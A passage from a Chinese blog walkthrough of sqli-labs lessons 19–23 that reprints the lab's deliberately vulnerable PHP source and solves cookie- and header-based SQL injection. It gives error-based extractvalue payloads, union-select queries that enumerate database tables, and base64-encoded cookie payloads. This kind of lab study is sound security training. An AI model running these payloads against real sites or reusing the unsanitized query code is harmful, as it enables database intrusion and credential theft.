&#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size &#x3D; 3 &gt;&#39;;            </span><br><span class="line">            echo &#39;Your Referer is: &#39; .$uagent;</span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">            echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot; &#x2F;&gt;&#39;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">        else</span><br><span class="line">            &#123;</span><br><span class="line">            echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D;&quot;3&quot;&gt;&#39;;</span><br><span class="line">            &#x2F;&#x2F;echo &quot;Try again looser&quot;;</span><br><span class="line">            print_r(mysql_error());</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;&quot;;            </span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot;  &#x2F;&gt;&#39;;    </span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&quot;;  </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20201004204805589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>他将ip和referer，进行了输出，</p>
<p><img src="https://img-blog.csdnimg.cn/20201004205438162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>输入单引号，发生了报错<br><img src="https://img-blog.csdnimg.cn/20201004205753988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>1&#39; and extractvalue(1,concat(0x7e,(database()),0x7e)) and &#39; </code><br>因为不知道他的前后有几个参数，所以我们使用and进行连接，</p>
<h3 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)"></a>Less-20 POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)</h3><p><img src="https://img-blog.csdnimg.cn/20201004205934909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们登陆后就会返回一个充满东西的页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;including the Mysql connect parameters.</span><br><span class="line">    include(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">if(!isset($_COOKIE[&#39;uname&#39;]))</span><br><span class="line">    &#123;</span><br><span class="line">    &#x2F;&#x2F;including the Mysql connect parameters.</span><br><span class="line">    include(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;div style&#x3D;&#39; margin-top:20px;color:#FFF; font-size:24px; text-align:center&#39;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color&#x3D;&#39;#FF0000&#39;&gt; Dhakkan &lt;&#x2F;font&gt;&lt;br&gt;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div  align&#x3D;&#39;center&#39; style&#x3D;&#39;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&#39;&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div style&#x3D;&#39;padding-top:10px; font-size:15px;&#39;&gt;&quot;;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;!--Form to post the contents --&gt;&quot;;</span><br><span class="line">    echo &#39;&lt;form action&#x3D;&quot; &quot; name&#x3D;&quot;form1&quot; method&#x3D;&quot;post&quot;&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    echo &#39; &lt;div style&#x3D;&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;;</span><br><span class="line">    echo &#39;   &lt;input type&#x3D;&quot;text&quot;  name&#x3D;&quot;uname&quot; value&#x3D;&quot;&quot;&#x2F;&gt;  &lt;&#x2F;div&gt;&#39;;</span><br><span class="line">  </span><br><span class="line">    echo &#39; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&#39;;</span><br><span class="line">    echo &#39;   &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;passwd&quot; value&#x3D;&quot;&quot;&#x2F;&gt;&lt;&#x2F;div&gt;&lt;&#x2F;br&gt;&#39;;    </span><br><span class="line">    echo &#39;   &lt;div style&#x3D;&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;&lt;&#x2F;div&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    echo &#39;&lt;&#x2F;form&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;&#x2F;div&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;&#x2F;div&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;div style&#x3D;&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;font size&#x3D;&quot;3&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;Less-20.jpg&quot; &#x2F;&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">function check_input($value)</span><br><span class="line">    &#123;</span><br><span class="line">    if(!empty($value))</span><br><span class="line">        &#123;</span><br><span class="line">        $value &#x3D; substr($value,0,20); &#x2F;&#x2F; truncation (see comments)</span><br><span class="line">        &#125;</span><br><span class="line">        if (get_magic_quotes_gpc())  &#x2F;&#x2F; Stripslashes if magic quotes enabled</span><br><span class="line">            &#123;</span><br><span class="line">            $value &#x3D; stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line">        if (!ctype_digit($value))       &#x2F;&#x2F; Quote if not a number</span><br><span class="line">            &#123;</span><br><span class="line">            $value &#x3D; &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">        $value &#x3D; intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    return $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    </span><br><span class="line">    if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))</span><br><span class="line">        &#123;</span><br><span class="line">    </span><br><span class="line">        $uname &#x3D; check_input($_POST[&#39;uname&#39;]);</span><br><span class="line">        $passwd &#x3D; check_input($_POST[&#39;passwd&#39;]);</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        $sql&#x3D;&quot;SELECT  users.username, users.password FROM users WHERE users.username&#x3D;$uname and users.password&#x3D;$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">        $result1 &#x3D; mysql_query($sql);</span><br><span class="line">        $row1 &#x3D; mysql_fetch_array($result1);</span><br><span class="line">        $cookee &#x3D; $row1[&#39;username&#39;];</span><br><span class="line">            if($row1)</span><br><span class="line">                &#123;</span><br><span class="line">                echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 3 &gt;&#39;;</span><br><span class="line">                setcookie(&#39;uname&#39;, $cookee, time()+3600);    </span><br><span class="line">                header (&#39;Location: index.php&#39;);</span><br><span class="line">                echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">                echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">                echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size &#x3D; 3 &gt;&#39;;            </span><br><span class="line">                &#x2F;&#x2F;echo &#39;Your Cookie is: &#39; .$cookee;</span><br><span class="line">                echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                print_r(mysql_error());            </span><br><span class="line">                echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">                echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;flag.jpg&quot; &#x2F;&gt;&#39;;</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            else</span><br><span class="line">                &#123;</span><br><span class="line">                echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D;&quot;3&quot;&gt;&#39;;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Try again looser&quot;;</span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                echo &quot;&lt;&#x2F;br&gt;&quot;;            </span><br><span class="line">                echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">                echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot; &#x2F;&gt;&#39;;    </span><br><span class="line">                echo &quot;&lt;&#x2F;font&gt;&quot;;  </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&quot;;  </span><br><span class="line">    echo &#39;&lt;&#x2F;font&gt;&#39;;</span><br><span class="line">    echo &#39;&lt;&#x2F;div&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!isset($_POST[&#39;submit&#39;]))</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            $cookee &#x3D; $_COOKIE[&#39;uname&#39;];</span><br><span class="line">            $format &#x3D; &#39;D d M Y - H:i:s&#39;;</span><br><span class="line">            $timestamp &#x3D; time() + 3600;</span><br><span class="line">            echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">            echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;</span><br><span class="line">            echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;Less-20.jpg&quot; &#x2F;&gt;&#39;;</span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">            echo &#39;&lt;br&gt;&lt;font color&#x3D; &quot;red&quot; font size&#x3D;&quot;4&quot;&gt;&#39;;    </span><br><span class="line">            echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&lt;br&gt;&quot;;    </span><br><span class="line">            echo &#39;&lt;font color&#x3D; &quot;cyan&quot; font size&#x3D;&quot;4&quot;&gt;&#39;;    </span><br><span class="line">            echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];            </span><br><span class="line">            echo &quot;&lt;&#x2F;font&gt;&lt;br&gt;&quot;;            </span><br><span class="line">            echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 4 &gt;&#39;;</span><br><span class="line">            echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;</span><br><span class="line">            echo &#39;&lt;font color&#x3D; &quot;orange&quot; font size &#x3D; 5 &gt;&#39;;            </span><br><span class="line">            echo &quot;YOUR COOKIE : uname &#x3D; $cookee and expires: &quot; . date($format, $timestamp);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">            $sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;&#39;$cookee&#39; LIMIT 0,1&quot;;</span><br><span class="line">            $result&#x3D;mysql_query($sql);</span><br><span class="line">            if (!$result)</span><br><span class="line">                  &#123;</span><br><span class="line">                  die(&#39;Issue with your mysql: &#39; . mysql_error());</span><br><span class="line">                  &#125;</span><br><span class="line">            $row &#x3D; mysql_fetch_array($result);</span><br><span class="line">            if($row)</span><br><span class="line">                &#123;</span><br><span class="line">                  echo &#39;&lt;font color&#x3D; &quot;pink&quot; font size&#x3D;&quot;5&quot;&gt;&#39;;    </span><br><span class="line">                  echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];</span><br><span class="line">                  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                echo &#39;&lt;font color&#x3D; &quot;grey&quot; font size&#x3D;&quot;5&quot;&gt;&#39;;      </span><br><span class="line">                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];</span><br><span class="line">                  echo &quot;&lt;&#x2F;font&gt;&lt;&#x2F;b&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                echo &#39;Your ID:&#39; .$row[&#39;id&#39;];</span><br><span class="line">                  &#125;</span><br><span class="line">            else    </span><br><span class="line">                &#123;</span><br><span class="line">                echo &quot;&lt;center&gt;&quot;;</span><br><span class="line">                echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;</span><br><span class="line">                echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap1.jpg&quot; &#x2F;&gt;&#39;;</span><br><span class="line">                echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;</span><br><span class="line">                &#x2F;&#x2F;echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;Less-20.jpg&quot; &#x2F;&gt;&#39;;</span><br><span class="line">                &#125;</span><br><span class="line">            echo &#39;&lt;center&gt;&#39;;</span><br><span class="line">            echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&#39;;</span><br><span class="line">            echo &#39;&lt;input  type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Delete Your Cookie!&quot; &#x2F;&gt;&#39;;</span><br><span class="line">            echo &#39;&lt;&#x2F;form&gt;&#39;;</span><br><span class="line">            echo &#39;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">        &#125;    </span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">        echo &#39;&lt;center&gt;&#39;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot; font size &#x3D; 6 &gt;&#39;;</span><br><span class="line">        echo &quot; Your Cookie is deleted&quot;;</span><br><span class="line">                setcookie(&#39;uname&#39;, $row1[&#39;username&#39;], time()-3600);</span><br><span class="line">                header (&#39;Location: index.php&#39;);</span><br><span class="line">        echo &#39;&lt;&#x2F;font&gt;&lt;&#x2F;center&gt;&lt;&#x2F;br&gt;&#39;;</span><br><span class="line">        </span><br><span class="line">        &#125;        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#x2F;&#x2F;header (&#39;Location: main.php&#39;);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">            &#x2F;&#x2F;echo &#39;&lt;img src&#x3D;&quot;..&#x2F;images&#x2F;slap.jpg&quot; &#x2F;&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">            &#x2F;&#x2F;logging the connection parameters to a file for analysis.    </span><br><span class="line">        $fp&#x3D;fopen(&#39;result.txt&#39;,&#39;a&#39;);</span><br><span class="line">        fwrite($fp,&#39;Cookie:&#39;.$cookee.&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">        fclose($fp);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20201004210118421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里将我们的各种信息进行了输出</p>
<p><img src="https://img-blog.csdnimg.cn/20201004210213647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center"><br>这里使用我们的cookie进行了数据库的查询<br>那么我们应该从这里入手<br><img src="https://img-blog.csdnimg.cn/20201004210250112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入单引号，发生了报错<br><img src="https://img-blog.csdnimg.cn/20201004210425207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>但是我们闭合，注释，以后，发现它只是进行了回显而已<br><img src="https://img-blog.csdnimg.cn/20201004210901149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以进行，<br>到4 发现报错，<br><img src="https://img-blog.csdnimg.cn/202010042110509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>我们让查询失败，同时查看我们的占位符<br>123的位置<br>其后与之前查询一致。<br><img src="https://img-blog.csdnimg.cn/20201004212030826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><code>-admin&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
<h2 id="page-2"><a href="#page-2" class="headerlink" title="page-2"></a>page-2</h2><h3 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a>Less-21 Cookie Injection- Error Based- complex - string</h3><p><img src="https://img-blog.csdnimg.cn/20201005202640143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们发现cookie变为了base64编码的，但是却可以正常显示，那么我们将上一关的payload base64编码试试<br><img src="https://img-blog.csdnimg.cn/20201005203102733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看源码，发现，这里进行了base64的加密，<br><img src="https://img-blog.csdnimg.cn/20201005203152897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解码同时，使用了（‘’）单引号，<br><img src="https://img-blog.csdnimg.cn/20201005203715359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功回显，<br><img src="https://img-blog.csdnimg.cn/2020100520383518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h3><p><img src="https://img-blog.csdnimg.cn/20201005204025428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>根据题目，我们加入双引号，base后，发现报错，进而可以更加确定，<br><img src="https://img-blog.csdnimg.cn/20201005204358702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>根据源码我们发现，使用双引号我们可以完成闭合，<br><code>&quot;SELECT * FROM users WHERE username=-admin&quot; union select 1,2,database()# LIMIT 0,1&quot;</code><br>相当于之后的注释掉，然后，查询之前的，union语句</p>
<p><img src="https://img-blog.csdnimg.cn/20201005204518654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h3><p><img src="https://img-blog.csdnimg.cn/20201005205305641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入单引号，获得报错，<br><img src="https://img-blog.csdnimg.cn/2020100521073067.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>开幕雷击中，他这里将注释符过滤了，<br>但是我们查看他的sql语句，</p>
